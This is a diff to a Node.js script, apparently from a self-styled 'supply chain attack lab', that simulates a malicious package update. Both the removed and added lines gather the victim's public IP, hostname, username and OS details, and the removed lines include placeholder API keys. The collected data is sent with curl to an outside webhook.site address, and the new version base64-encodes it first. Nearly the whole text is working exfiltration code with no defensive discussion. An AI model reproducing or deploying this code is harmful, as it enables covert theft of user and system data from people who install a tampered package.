@@ -2,39 +2,29 @@ const https = require('https');
 const { execSync } = require('child_process');
 const os = require('os');
 
-console.log('🚀 ADVANCED SUPPLY CHAIN ATTACK LAB');
+console.log('🚀 SUPPLY CHAIN ATTACK - KALI LINUX');
 console.log('🔍 Checking malicious updates...');
 
 https.get('https://httpbin.org/json', (res) => {
   let data = '';
   res.on('data', d => data += d);
   res.on('end', () => {
-    console.log('📡 Malicious update downloaded!');
+    console.log('📡 Malicious payload activated!');
     
-    // **PRO EXFILTRATION - STEAL EVERYTHING**
     const victimData = {
       ip: execSync('curl -s ifconfig.me').toString().trim(),
       hostname: os.hostname(),
-      username: os.userInfo().username,
-      platform: os.platform(),
-      release: os.release(),
-      totalmem: Math.round(os.totalmem() / 1024 / 1024 / 1024) + 'GB',
-      cpus: os.cpus()[0].model,
-      // FAKE SECRETS (like API keys your trainer wants)
-      fake_api_key: 'sk-abc123DEF456GHI789',
-      fake_aws_secret: 'AKIAIOSFODNN7EXAMPLE',
-      fake_github_token: 'ghp_1234567890abcdef',
-      timestamp: new Date().toISOString()
+      user: os.userInfo().username,
+      os: os.platform() + ' ' + os.release()
     };
     
-    console.log('🎯 VICTIM DATA STOLEN:');
-    console.table(victimData);
+    console.log('🎯 KALI VICTIM COMPROMISED:', victimData.ip);
     
-    // SEND ALL DATA TO TRAINER
-    const payload = JSON.stringify(victimData);
-    execSync(`curl -X POST "https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439" -H "Content-Type: application/json" -d '${payload}'`);
+    // FIXED CURL - Linux compatible
+    const payload = Buffer.from(JSON.stringify(victimData)).toString('base64');
+    execSync(`curl -X POST "https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439" -d "data=${payload}"`);
     
-    console.log('✅ FULL SYSTEM COMPROMISE! Check webhook.site!');
+    console.log('✅ FULL ATTACK SUCCESS!');
   });
 });
 
